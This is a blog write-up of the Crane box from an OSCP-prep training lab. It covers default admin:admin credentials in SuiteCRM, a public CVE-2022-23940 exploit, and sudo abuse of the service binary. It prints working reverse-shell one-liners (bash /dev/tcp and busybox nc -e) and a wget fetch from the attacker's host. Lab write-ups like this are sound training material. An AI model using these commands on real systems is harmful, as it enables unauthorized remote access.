---
layout: writeup
title: Crane - Proving Grounds
date: 2024-06-28 13:32:20 +0300
description: A Writeup of the Crane Box from Proving Grounds
image: # /assets/images/Crane/Crane_5.png
fig-caption: # Add figcaption (optional)
tags: [Linux, TJ Null]
---


Here is a writeup for the Crane lab on [Proving Grounds](https://www.offsec.com/labs/), another box from TJ Null's OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#). I start out with an nmap scan and check out port 80 as soon as it pops up. 

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.38 (Debian)
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Crane_5.png]](/assets/images/Crane/Crane_5.png){: .center-aligned width="600px"}

Looks like we have a web app entitled SuiteCRM. I check the source for a version and run a gobuster scan, but it also turns out I can log into using admin:admin. This might come in handy because I see some authenticated exploits on exploit-db. 

It looks like this one actually has admin:admin hardcoded. Maybe I can check authenticated exploits for clues like that in the future. We'll download it and change the URL.

![Crane_4.png](/assets/images/Crane/Crane_4.png){: .responsive-image}

I can't get this one working, but I look around on Google, and I find another one here: https://github.com/manuelz120/CVE-2022-23940. 

After cloning the repo I run this command: `python3 exploit.py -h http://192.168.162.146/index.php -u admin -p admin -P 'wget http://192.168.45.154/shell8080.sh'` and the file is downloaded. That means we have execution at least. Unfortunately I can't get the shell to execute, or at least I can't get the reverse shell.  I make a note to retry with different shells and ports and from different directories. It makes sense to start with ports first, but I try with 80, 8080, 443, and 3306 (because there is a SQL server running) using a simpler shell (`/bin/bash -i >& /dev/tcp/192.168.45.154/80 0>&1`). Nothing on that unfortunately. 

I try a few other reverse shells and can't seem to get them working on any port, until I try this one: `busybox nc 192.168.45.154 80 -e /bin/bash`. The full command is  `python3 exploit.py -h http://192.168.162.146/index.php -u admin -p admin -P 'busybox nc 192.168.45.154 80 -e /bin/bash'`. I'm not sure I've used this one much, but I noticed in someone else's OSCP notes as a notably good one. Maybe I need to try it more, but I did get a shell with it as www-data. 

I download and run `linpeas.sh` to scope the machine out. The /usr/sbin/service binary immediately jumps out while I'm scrolling through the linpeas output. 

![Crane_3.png](/assets/images/Crane/Crane_3.png){: .responsive-image}

Then I notice I can run it using sudo. That's a good sign. 

![Crane_2.png](/assets/images/Crane/Crane_2.png){: .responsive-image}

Bingo. 

![Crane_1.png](/assets/images/Crane/Crane_1.png){: .responsive-image}

What did we learn on this box? Don't give up if a few shells don't work, and spend some more time with that busybox one in particular. Oh - and try admin:admin when logging into a service. Note that there is a local.txt file in the /var/www/html directory. I missed that when I got the initial shell. 


